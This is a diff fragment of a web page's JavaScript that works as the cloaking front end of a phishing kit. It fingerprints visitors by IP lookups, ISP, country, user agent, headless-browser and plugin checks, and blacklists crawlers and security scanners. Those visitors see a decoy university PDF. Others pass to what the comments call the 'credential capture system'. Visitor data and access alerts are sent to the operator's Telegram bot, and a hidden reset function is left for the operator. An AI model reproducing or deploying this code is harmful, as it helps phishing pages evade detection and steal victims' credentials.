+                });
+            }
+        }
+        
+        localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify(attempts));
+        return attempts[ip].count;
+        
+    } catch (error) {
+        console.error('Error tracking attempt:', error);
+        return 1;
+    }
+}
+
+// ============================================================================
+// PARAMETER VALIDATION - KEEP ALL
+// ============================================================================
+function validateParameters() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const results = {
+        valid: true,
+        missingParams: [],
+        invalidParams: [],
+        values: {}
+    };
+    
+    // Check required parameters
+    Object.keys(SECURITY_CONFIG.REQUIRED_PARAMS).forEach(param => {
+        const value = urlParams.get(param);
+        const pattern = SECURITY_CONFIG.REQUIRED_PARAMS[param];
+        
+        if (!value) {
+            results.valid = false;
+            results.missingParams.push(param);
+        } else if (!pattern.test(value)) {
+            results.valid = false;
+            results.invalidParams.push({ param, value, pattern: pattern.toString() });
+        } else {
+            results.values[param] = value;
+        }
+    });
+    
+    // Check Bd parameter (if aggressive mode is on)
+    if (SECURITY_CONFIG.AGGRESSIVE_MODE || SECURITY_CONFIG.BLACKLIST_ON_MISSING_BD) {
+        const bdParam = urlParams.get('Bd');
+        if (!bdParam || !['A', 'X', 'S', 'O', 'C'].includes(bdParam.toUpperCase())) {
+            results.valid = false;
+            results.missingParams.push('Bd');
+        } else {
+            results.values.Bd = bdParam;
+        }
+    }
+    
+    // Store valid parameters for session
+    if (results.valid) {
+        localStorage.setItem(STORAGE_KEYS.VALID_PARAMS, JSON.stringify({
+            ...results.values,
+            validatedAt: new Date().toISOString(),
+            sessionId: generateSessionId()
+        }));
+    }
+    
+    return results;
+}
+
+// ============================================================================
+// SECURITY CHECKS - AGGRESSIVE MODE - KEEP ALL
+// ============================================================================
+async function performSecurityChecks() {
+    try {
+        // 1. Get IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
+        
+        // Track this attempt
+        const attemptCount = trackAttempt(ip);
+        
+        // 2. Check blacklist
+        if (isBlacklisted(ip)) {
+            return {
+                allowed: false,
+                reason: 'Blacklisted IP address',
+                ip: ip,
+                action: 'BLOCKED_BLACKLIST'
+            };
+        }
+        
+        // 3. Validate parameters (AGGRESSIVE)
+        const paramValidation = validateParameters();
+        if (!paramValidation.valid) {
+            if (SECURITY_CONFIG.AGGRESSIVE_MODE) {
+                addToBlacklist(ip, 'Invalid or missing parameters', {
+                    missingParams: paramValidation.missingParams,
+                    invalidParams: paramValidation.invalidParams,
+                    attemptCount: attemptCount
+                });
+            }
+            
+            return {
+                allowed: false,
+                reason: 'Invalid access parameters',
+                details: paramValidation,
+                ip: ip,
+                action: 'BLOCKED_PARAMS'
+            };
+        }
+        
+        // 4. Check user agent
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isBot = SECURITY_CONFIG.BLACKLISTED_WORDS.some(word => 
+            userAgent.includes(word.toLowerCase())
+        );
+        
+        if (isBot) {
+            addToBlacklist(ip, 'Bot/crawler detected', {
+                matchedWord: SECURITY_CONFIG.BLACKLISTED_WORDS.find(word => 
+                    userAgent.includes(word.toLowerCase())
+                ),
+                userAgent: navigator.userAgent
+            });
+            
+            return {
+                allowed: false,
+                reason: 'Bot/crawler detected',
+                ip: ip,
+                action: 'BLOCKED_BOT'
+            };
+        }
+        
+        // 5. Get detailed IP information
+        let ipDetails = {};
+        try {
+            const ipInfoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+            ipDetails = await ipInfoResponse.json();
+            
+            // Check country
+            if (SECURITY_CONFIG.BLACKLISTED_COUNTRIES.includes(ipDetails.country_code)) {
+                addToBlacklist(ip, 'Blacklisted country', {
+                    country: ipDetails.country_name,
+                    countryCode: ipDetails.country_code
+                });
+                
+                return {
+                    allowed: false,
+                    reason: 'Access from restricted country',
+                    country: ipDetails.country_name,
+                    ip: ip,
+                    action: 'BLOCKED_COUNTRY'
+                };
+            }
+            
+            // Check hostname
+            if (ipDetails.org || ipDetails.asn) {
+                const orgInfo = (ipDetails.org || ipDetails.asn).toLowerCase();
+                const isBlacklistedHostname = SECURITY_CONFIG.BLACKLISTED_HOSTNAMES.some(pattern => 
+                    orgInfo.includes(pattern.toLowerCase())
+                );
+                
+                if (isBlacklistedHostname) {
+                    addToBlacklist(ip, 'Blacklisted hostname/ISP', {
+                        organization: ipDetails.org,
+                        asn: ipDetails.asn,
+                        matchedPattern: SECURITY_CONFIG.BLACKLISTED_HOSTNAMES.find(pattern => 
+                            orgInfo.includes(pattern.toLowerCase())
+                        )
+                    });
+                    
+                    return {
+                        allowed: false,
+                        reason: 'Suspicious hostname/ISP detected',
+                        organization: ipDetails.org,
+                        ip: ip,
+                        action: 'BLOCKED_HOSTNAME'
+                    };
+                }
+            }
+            
+        } catch (ipInfoError) {
+            console.warn('Could not fetch detailed IP info:', ipInfoError);
+            // Continue without detailed info
+        }
+        
+        // 6. Check screen resolution (headless detection)
+        if (screen.width < 100 || screen.height < 100) {
+            addToBlacklist(ip, 'Suspicious screen resolution', {
+                resolution: `${screen.width}x${screen.height}`,
+                userAgent: navigator.userAgent
+            });
+            
+            return {
+                allowed: false,
+                reason: 'Suspicious device configuration',
+                ip: ip,
+                action: 'BLOCKED_RESOLUTION'
+            };
+        }
+        
+        // 7. Check for WebDriver property (headless detection)
+        if (navigator.webdriver === true) {
+            addToBlacklist(ip, 'WebDriver detected (headless browser)', {
+                userAgent: navigator.userAgent
+            });
+            
+            return {
+                allowed: false,
+                reason: 'Automated browser detected',
+                ip: ip,
+                action: 'BLOCKED_WEBDRIVER'
+            };
+        }
+        
+        // 8. Check plugins (headless browsers often have few/no plugins)
+        const plugins = navigator.plugins.length;
+        if (plugins === 0) {
+            addToBlacklist(ip, 'No browser plugins detected (suspicious)', {
+                pluginCount: plugins,
+                userAgent: navigator.userAgent
+            });
+            
+            return {
+                allowed: false,
+                reason: 'Suspicious browser configuration',
+                ip: ip,
+                action: 'BLOCKED_PLUGINS'
+            };
+        }
+        
+        // All checks passed
+        return {
+            allowed: true,
+            ip: ip,
+            details: {
+                ...paramValidation.values,
+                ipInfo: ipDetails,
+                attemptCount: attemptCount,
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                sessionId: generateSessionId()
+            }
+        };
+        
+    } catch (error) {
+        console.error('Security check error:', error);
+        
+        // In aggressive mode, block if we can't verify
+        if (SECURITY_CONFIG.AGGRESSIVE_MODE) {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                addToBlacklist(ipData.ip, 'Security verification failed', {
+                    error: error.message
+                });
+            } catch (e) {
+                // Ignore secondary errors
+            }
+        }
+        
+        return {
+            allowed: false,
+            reason: 'Security verification failed',
+            error: error.message,
+            action: 'BLOCKED_ERROR'
+        };
+    }
+}
+
+// ============================================================================
+// BLACKLIST MANAGEMENT FUNCTIONS - KEEP ALL
+// ============================================================================
+function clearBlacklist() {
+    localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify([]));
+    localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify({}));
+    console.log('🔄 Blacklist cleared');
+    return true;
+}
+
+function viewBlacklist() {
+    try {
+        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
+        const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
+        
+        return {
+            blacklist: blacklist,
+            attempts: attempts,
+            stats: {
+                totalBlacklisted: blacklist.length,
+                totalAttempts: Object.keys(attempts).length,
+                recentBlacklist: blacklist.slice(-10) // Last 10 entries
+            }
+        };
+        
+    } catch (error) {
+        console.error('Error viewing blacklist:', error);
+        return { error: error.message };
+    }
+}
+
+function removeFromBlacklist(ip) {
+    try {
+        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
+        const filtered = blacklist.filter(entry => entry.ip !== ip);
+        localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify(filtered));
+        
+        // Also remove from attempts
+        const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
+        delete attempts[ip];
+        localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify(attempts));
+        
+        console.log(`✅ Removed ${ip} from blacklist`);
+        return true;
+        
+    } catch (error) {
+        console.error('Error removing from blacklist:', error);
+        return false;
+    }
+}
+
+function exportBlacklist() {
+    try {
+        const data = viewBlacklist();
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `security-blacklist-${new Date().toISOString().split('T')[0]}.json`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        return true;
+    } catch (error) {
+        console.error('Error exporting blacklist:', error);
+        return false;
+    }
+}
+
+// ============================================================================
+// HELPER FUNCTIONS - KEEP ALL
+// ============================================================================
+function generateSessionId() {
+    return 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+}
+
+async function sendSecurityAlert(type, data) {
+    if (!SECURITY_CONFIG.ENABLE_TELEGRAM_ALERTS) return;
+    
+    try {
+        let message = '';
+        
+        switch(type) {
+            case 'BLACKLIST_ADDED':
+                message = `🚫 *BLACKLIST ALERT - ${data.ip}*
+                
+🔒 *Reason:* ${data.reason}
+📅 *Time:* ${new Date().toLocaleString()}
+🌐 *URL:* ${data.url}
+🖥️ *User Agent:* ${data.userAgent.substring(0, 100)}...
+                `;
+                break;
+                
+            case 'BLACKLISTED_PDF_ACCESS':
+                message = `📄 *BLACKLISTED IP ACCESSED PDF - ${data.ip}*
+                
+⚠️ *Status:* Blacklisted IP shown PDF
+🔒 *Reason:* ${data.reason}
+🎯 *Action:* ${data.action}
+📅 *Time:* ${new Date().toLocaleString()}
+🌐 *URL:* ${data.url}
+🖥️ *IP:* ${data.ip}
+🌍 *Country:* ${data.country || 'Unknown'}
+🏢 *ISP:* ${data.isp || 'Unknown'}
+                `;
+                break;
+                
+            case 'SECURITY_BREACH':
+                message = `⚠️ *SECURITY BREACH DETECTED*
+                
+🎯 *Attack Type:* ${data.type}
+📡 *Source IP:* ${data.ip}
+📅 *Time:* ${new Date().toLocaleString()}
+🔍 *Details:* ${JSON.stringify(data.details, null, 2)}
+                `;
+                break;
+                
+            case 'ACCESS_GRANTED':
+                message = `✅ *ACCESS GRANTED*
+                
+👤 *IP:* ${data.ip}
+📅 *Time:* ${new Date().toLocaleString()}
+🌍 *Location:* ${data.location || 'Unknown'}
+🖥️ *Device:* ${data.device || 'Unknown'}
+🔑 *Session ID:* ${data.sessionId}
+                `;
+                break;
+        }
+        
+        const url = `https://api.telegram.org/bot${SECURITY_CONFIG.BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: SECURITY_CONFIG.CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+    } catch (error) {
+        console.error('Error sending security alert:', error);
+    }
+}
+
+// ============================================================================
+// PAGE LOADING FUNCTIONS - UPDATED
+// ============================================================================
+function showFullScreenPDF(securityCheck = null) {
+    // Get ISP/country info if available
+    let country = 'Unknown';
+    let isp = 'Unknown';
+    
+    if (securityCheck && securityCheck.details && securityCheck.details.ipInfo) {
+        country = securityCheck.details.ipInfo.country_name || 'Unknown';
+        isp = securityCheck.details.ipInfo.org || securityCheck.details.ipInfo.asn || 'Unknown';
+    }
+    
+    // Show PDF
+    document.body.innerHTML = `
+        <div class="pdf-fullscreen">
+            <iframe src="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">
+                This browser does not support PDFs. Please download the PDF to view it: 
+                <a href="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">Download PDF</a>.
+            </iframe>
+        </div>
+        <style>
+            .pdf-fullscreen {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: #f0f0f0;
+            }
+            
+            .pdf-fullscreen iframe {
+                width: 100%;
+                height: 100%;
+                border: none;
+            }
+            
+            body {
+                margin: 0;
+                padding: 0;
+                overflow: hidden;
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            }
+        </style>
+    `;
+    
+    // Send Telegram alert about blacklisted access
+    if (SECURITY_CONFIG.ENABLE_TELEGRAM_ALERTS && securityCheck) {
+        sendSecurityAlert('BLACKLISTED_PDF_ACCESS', {
+            ip: securityCheck.ip || 'Unknown',
+            reason: securityCheck.reason || 'Security violation',
+            action: securityCheck.action || 'BLOCKED',
+            url: window.location.href,
+            country: country,
+            isp: isp,
+            userAgent: navigator.userAgent.substring(0, 150)
+        });
+    }
+}
+
+// ============================================================================
+// SECURITY INITIALIZATION - UPDATED TO SHOW PDF
+// ============================================================================
+async function initializeSecurity() {
+    console.log('🔐 Initializing security system...');
+    
+    // Initialize storage
+    initializeSecurityStorage();
+    
+    // Perform security checks
+    const securityCheck = await performSecurityChecks();
+    
+    if (!securityCheck.allowed) {
+        // If blacklisted or security failed, show PDF instead of "Access Denied"
+        console.log(`🚫 Security failed - Showing PDF: ${securityCheck.reason}`);
+        
+        // Show full screen PDF
+        showFullScreenPDF(securityCheck);
+        
+        // Don't throw error, just return
+        return securityCheck;
+    }
+    
+    // Send access granted notification
+    await sendSecurityAlert('ACCESS_GRANTED', {
+        ip: securityCheck.ip,
+        location: securityCheck.details?.ipInfo?.country_name,
+        device: securityCheck.details?.userAgent,
+        sessionId: securityCheck.details?.sessionId
+    });
+    
+    console.log('✅ Security check passed');
+    return securityCheck;
+}
+
+// ============================================================================
+// ADMIN FUNCTIONS (for debugging/management)
+// ============================================================================
+function SecurityAdmin() {
+    return {
+        // View current blacklist
+        viewBlacklist: function() {
+            const data = viewBlacklist();
+            console.log('📋 Blacklist:', data);
+            return data;
+        },
+        
+        // Clear entire blacklist
+        clearAll: function() {
+            const confirmed = confirm('Are you sure you want to clear the entire blacklist?');
+            if (confirmed) {
+                return clearBlacklist();
+            }
+            return false;
+        },
+        
+        // Remove specific IP
+        removeIP: function(ip) {
+            return removeFromBlacklist(ip);
+        },
+        
+        // Export blacklist
+        export: function() {
+            return exportBlacklist();
+        },
+        
+        // Check current IP status
+        checkCurrentIP: async function() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const isBlocked = isBlacklisted(ipData.ip);
+                
+                return {
+                    ip: ipData.ip,
+                    blacklisted: isBlocked,
+                    status: isBlocked ? '🚫 BLACKLISTED' : '✅ CLEAR'
+                };
+            } catch (error) {
+                return { error: error.message };
+            }
+        },
+        
+        // Get security stats
+        getStats: function() {
+            const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
+            const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
+            
+            return {
+                blacklistedIPs: blacklist.length,
+                trackedIPs: Object.keys(attempts).length,
+                recentBlocks: blacklist.slice(-5),
+                config: SECURITY_CONFIG
+            };
+        }
+    };
+}
+
+// Make admin functions available globally for debugging
+window.SecurityAdmin = SecurityAdmin();
+
+// ============================================================================
+// HIDDEN CLEAR FUNCTION - FOR YOU ONLY
+// ============================================================================
+window.clX = function() {
+    console.log('🔄 Clearing blacklist via clX()...');
+    localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify([]));
+    localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify({}));
+    console.log('✅ Blacklist cleared!');
+    alert('Blacklist cleared!');
+    return true;
+};
+
+// ============================================================================
+// INITIALIZE ON PAGE LOAD
+// ============================================================================
+document.addEventListener('DOMContentLoaded', async function() {
+    try {
+        const securityCheck = await initializeSecurity();
+        
+        // If security check passed (allowed: true), load your credential system
+        if (securityCheck.allowed) {
+            console.log('🚀 Loading secure application...');
+            
+            // Your credential capture system should initialize here
+            // Add your existing initialize() function call here
+            
+            // Add a security badge to the page
+            const securityBadge = document.createElement('div');
+            securityBadge.style.cssText = `
+                position: fixed;
+                bottom: 10px;
+                right: 10px;
+                background: rgba(0,0,0,0.7);
+                color: white;
+                padding: 5px 10px;
+                border-radius: 4px;
+                font-size: 10px;
+                z-index: 9999;
+                font-family: monospace;
+            `;
+            securityBadge.textContent = '🔐 SECURE';
+            document.body.appendChild(securityBadge);
+        }
+        // If security check failed (allowed: false), PDF is already shown
+        // No further action needed
+        
+    } catch (error) {
+        console.error('Security initialization failed:', error);
+        // If there's an error in the security check itself, show PDF as fallback
+        showFullScreenPDF({ reason: 'Security system error', action: 'BLOCKED_ERROR' });
+    }
+});
+  </script>
+</body>
+</html>
